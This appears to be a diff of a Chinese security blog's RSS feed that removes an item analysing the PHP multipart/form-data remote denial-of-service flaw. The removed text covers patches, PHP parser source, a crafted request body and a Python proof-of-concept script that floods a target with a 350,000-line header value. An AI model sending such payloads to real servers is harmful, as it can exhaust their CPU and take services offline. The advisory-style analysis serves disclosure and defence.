@@ -2,12 +2,15 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>漏洞 on 找节拍</title>
-    <link>http://inorz.net/tags/%E6%BC%8F%E6%B4%9E/index.xml</link>
+    <link>http://inorz.net/tags/%E6%BC%8F%E6%B4%9E/</link>
     <description>Recent content in 漏洞 on 找节拍</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh-cn</language>
     <copyright>©2015-2017 ღ fuqihuan</copyright>
-    <atom:link href="http://inorz.net/tags/%E6%BC%8F%E6%B4%9E/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Thu, 21 May 2015 14:45:48 +0000</lastBuildDate>
+    
+	<atom:link href="http://inorz.net/tags/%E6%BC%8F%E6%B4%9E/index.xml" rel="self" type="application/rss+xml" />
+    
     
     <item>
       <title>PHP Multipartform-data 远程DOS攻击漏洞</title>
@@ -24,169 +27,7 @@
 
 &lt;p&gt;　　PHP所有版本&lt;/p&gt;
 
-&lt;p&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;解决方案&#34;&gt;【解决方案】&lt;/h3&gt;
-
-&lt;p&gt;　　1. 5.2.17 ：&lt;a href=&#34;https://coding.net/u/simapple/p/oldphppatch/git/blob/master/CVE-ID2015-4024/php5.2patch&#34;&gt;一个民间的补丁&lt;/a&gt;
-　　2. 5.4.X 直接升级到最新的5.4.41&lt;/p&gt;
-
-&lt;h3 id=&#34;漏洞入口&#34;&gt;【漏洞入口】&lt;/h3&gt;
-
-&lt;p&gt;　　PHP源码中main/ rfc1867.c负责解析multipart/form-data协议，DOS漏洞出现在main/rfc46675pxultipart_buffer_headers函数。
-　　在详细分析漏洞函数前，先分析进入漏洞函数的路径。PHP解析multipart/form-data http请求体的入口函数在SAPI_POST_HANDLER_FUNC(rfc1867.c中的函数)，代码如下。SAPI_POST_HANDLER_FUNC函数首先解析请求的boundary。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;/* Get the boundary */
-boundary= strstr(content_type_dup, &amp;quot;boundary&amp;quot;);
- if(!boundary) {
-     intcontent_type_len = strlen(content_type_dup);
-     char*content_type_lcase = estrndup(content_type_dup, content_type_len);
-
-     php_strtolower(content_type_lcase,content_type_len);
-     boundary= strstr(content_type_lcase, &amp;quot;boundary&amp;quot;);
-     if(boundary) {
-             boundary= content_type_dup + (boundary - content_type_lcase);
-     }
-     efree(content_type_lcase);
-  }
-  if(!boundary || !(boundary = strchr(boundary, &#39;=&#39;))) {
-       sapi_module.sapi_error(E_WARNING,&amp;quot;Missing boundary in multipart/form-data POST data&amp;quot;);
-       return;
-   }
-   boundary++;
-   boundary_len= strlen(boundary);
-   …
-   …
-   while(!multipart_buffer_eof(mbuff TSRMLS_CC))
-   {
-                   charbuff[FILLUNIT];
-                   char*cd = NULL, *param = NULL, *filename = NULL, *tmp = NULL;
-                   size_tblen = 0, wlen = 0;
-                   off_toffset;
-
-                   zend_llist_clean(&amp;amp;header);
-
-                   if(!multipart_buffer_headers(mbuff, &amp;amp;header TSRMLS_CC)) {
-                            gotofileupload_done;
-                   }
-
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&#34;漏洞原理&#34;&gt;【漏洞原理】&lt;/h3&gt;
-
-&lt;p&gt;　　在multipart_buffer_headers函数解析header对应value时，value值存在n行。每行的字符串以空白符开头或不存字符&amp;rsquo;:&amp;lsquo;，都触发以下合并value的代码块。那么解析header的value就要执行(n-1)次合并value的代码块。该代码块进行1次内存分配，2次内存拷贝，1次内存释放。当value值越来越长，将消耗大量的cpu时间。如果以拷贝一个字节为时间复杂度单位，value的长度为m，时间复杂度为m*m.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;prev_len= strlen(prev_entry.value);
-     cur_len= strlen(line);
-
-     entry.value= emalloc(prev_len + cur_len + 1); //1次分片内存
-     memcpy(entry.value,prev_entry.value, prev_len); //1次拷贝
-     memcpy(entry.value+ prev_len, line, cur_len);   //1次拷贝
-     entry.value[cur_len+ prev_len] = &#39;\0&#39;;
-
-     entry.key= estrdup(prev_entry.key);
-
-     zend_llist_remove_tail(header);//1次内存释放
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&#34;漏洞利用&#34;&gt;【漏洞利用】&lt;/h3&gt;
-
-&lt;p&gt;　　构造像以下恶意的http请求，当存在350000行a\n时，在我的测试环境中，一个http请求将消耗10s的cpu时间。每隔若干秒，同时并发多个请求，将导致server端cpu资源长期耗尽，从而到达DOS。总的来说，利用方式和Hash Collision DOS一样。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;------WebKitFormBoundarypE33TmSNWwsMphqz
-Content-Disposition:form-data; name=&amp;quot;file&amp;quot;; filename=&amp;quot;s
-a
-a
-a
-…
-…
-…
-a&amp;quot;
-Content-Type:application/octet-stream
-
-why is it?
-------WebKitFormBoundarypE33TmSNWwsMphqz
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&#34;漏洞测试&#34;&gt;【漏洞测试】&lt;/h3&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;&#39;&#39;&#39;
-Author: Shusheng Liu,The Department of Security Cloud, Baidu
-email: liusscs@163.com
-/* &amp;lt;![CDATA[ */!function(){try{var t=&amp;quot;currentScript&amp;quot;in document?document.currentScript:function(){for(var t=document.getElementsByTagName(&amp;quot;script&amp;quot;),e=t.length;e--;)if(t[e].getAttribute(&amp;quot;cf-hash&amp;quot;))return t[e]}();if(t&amp;amp;&amp;amp;t.previousSibling){var e,r,n,i,c=t.previousSibling,a=c.getAttribute(&amp;quot;data-cfemail&amp;quot;);if(a){for(e=&amp;quot;&amp;quot;,r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)}}}catch(u){}}();/* ]]&amp;gt; */
-&#39;&#39;&#39;
-import sys
-import urllib,urllib2
-import datetime
-from optparse import OptionParser
-
-def http_proxy(proxy_url):
-
-    proxy_handler = urllib2.ProxyHandler({&amp;quot;http&amp;quot; : proxy_url})
-    null_proxy_handler = urllib2.ProxyHandler({})
-    opener = urllib2.build_opener(proxy_handler)
-    urllib2.install_opener(opener)
-#end http_proxy
-
-def check_php_multipartform_dos(url,post_body,headers):
-    req = urllib2.Request(url)
-    for key in headers.keys():
-        req.add_header(key,headers[key])
-    starttime = datetime.datetime.now();
-    fd = urllib2.urlopen(req,post_body)
-    html = fd.read()
-    endtime = datetime.datetime.now()
-    usetime=(endtime - starttime).seconds
-    if(usetime &amp;gt; 5):
-        result = url+&amp;quot; is vulnerable&amp;quot;;
-    else:
-        if(usetime &amp;gt; 3):
-            result = &amp;quot;need to check normal respond time&amp;quot;
-    return [result,usetime]
-#end
-
-
-def main():
-    #http_proxy(&amp;quot;http://127.0.0.1:8089&amp;quot;)
-    parser = OptionParser()
-    parser.add_option(&amp;quot;-t&amp;quot;, &amp;quot;--target&amp;quot;, action=&amp;quot;store&amp;quot;,
-                  dest=&amp;quot;target&amp;quot;,
-                  default=False,
-          type=&amp;quot;string&amp;quot;,
-                  help=&amp;quot;test target&amp;quot;)
-    (options, args) = parser.parse_args()
-    if(options.target):
-    target = options.target
-    else:
-    return;
-
-    Num=350000
-    headers={&#39;Content-Type&#39;:&#39;multipart/form-data; boundary=----WebKitFormBoundaryX3B7rDMPcQlzmJE1&#39;,
-            &#39;Accept-Encoding&#39;:&#39;gzip, deflate&#39;,
-            &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36&#39;}
-    body = &amp;quot;------WebKitFormBoundaryX3B7rDMPcQlzmJE1\nContent-Disposition: form-data; name=\&amp;quot;file\&amp;quot;; filename=sp.jpg&amp;quot;
-    payload=&amp;quot;&amp;quot;
-    for i in range(0,Num):
-        payload = payload + &amp;quot;a\n&amp;quot;
-    body = body + payload;
-    body = body + &amp;quot;Content-Type: application/octet-stream\r\n\r\ndatadata\r\n------WebKitFormBoundaryX3B7rDMPcQlzmJE1--&amp;quot;
-    print &amp;quot;starting...&amp;quot;;
-    respond=check_php_multipartform_dos(target,body,headers)
-    print &amp;quot;Result : &amp;quot;
-    print respond[0]
-    print &amp;quot;Respond time : &amp;quot;+str(respond[1]) + &amp;quot; seconds&amp;quot;;
-
-if __name__==&amp;quot;__main__&amp;quot;:
-    main()
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&#34;参考&#34;&gt;【参考】&lt;/h3&gt;
-
-&lt;ol&gt;
-&lt;li&gt;&lt;a href=&#34;https://bugs.php.net/bug.php?id=69364&#34;&gt;https://bugs.php.net/bug.php?id=69364&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://php.net/ChangeLog-5.php#5.5.25&#34;&gt;http://php.net/ChangeLog-5.php#5.5.25&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://drops.wooyun.org/papers/6077&#34;&gt;http://drops.wooyun.org/papers/6077&lt;/a&gt;&lt;/li&gt;
-&lt;/ol&gt;</description>
+&lt;p&gt;&lt;/p&gt;</description>
     </item>
     
   </channel>
